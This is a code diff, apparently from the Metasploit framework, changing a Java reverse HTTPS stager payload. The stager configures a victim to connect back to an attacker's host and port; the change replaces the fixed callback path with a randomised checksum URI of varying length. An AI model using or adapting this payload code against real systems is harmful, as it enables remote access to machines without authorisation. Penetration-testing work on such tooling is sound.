@@ -8,7 +8,7 @@ require 'msf/core/handler/reverse_https'
 
 module Metasploit3
 
-  CachedSize = 6308
+  CachedSize = 6307
 
   include Msf::Payload::Stager
   include Msf::Payload::Java
@@ -42,12 +42,22 @@ module Metasploit3
   end
 
   def config
+    # Default URL length is 30-256 bytes
+    uri_req_len = 30 + rand(256-30)
+
+    # Generate the short default URL if we don't know available space
+    if self.available_space.nil?
+      uri_req_len = 5
+    end
+
     spawn = datastore["Spawn"] || 2
     c =  ""
     c << "Spawn=#{spawn}\n"
     c << "URL=https://#{datastore["LHOST"]}"
     c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-    c << "/INITJM\n"
+    c << "/"
+    c << generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITJ, uri_req_len)
+    c << "\n"
 
     c
   end
